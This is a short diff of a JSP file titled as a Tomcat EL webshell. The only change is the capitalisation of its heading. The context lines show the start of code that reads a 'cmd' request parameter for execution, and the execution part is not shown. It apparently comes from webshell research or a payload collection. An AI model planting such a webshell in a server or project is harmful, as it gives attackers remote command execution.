@@ -4,7 +4,7 @@
 <%@ page import="java.io.InputStreamReader" %>
 <html>
 <body>
-<h2>Tomcat EL的JSP Webshell</h2>
+<h2>Tomcat EL的JSP WebShell</h2>
 <%
     StringBuilder stringBuilder = new StringBuilder();
     String cmd = request.getParameter("cmd");
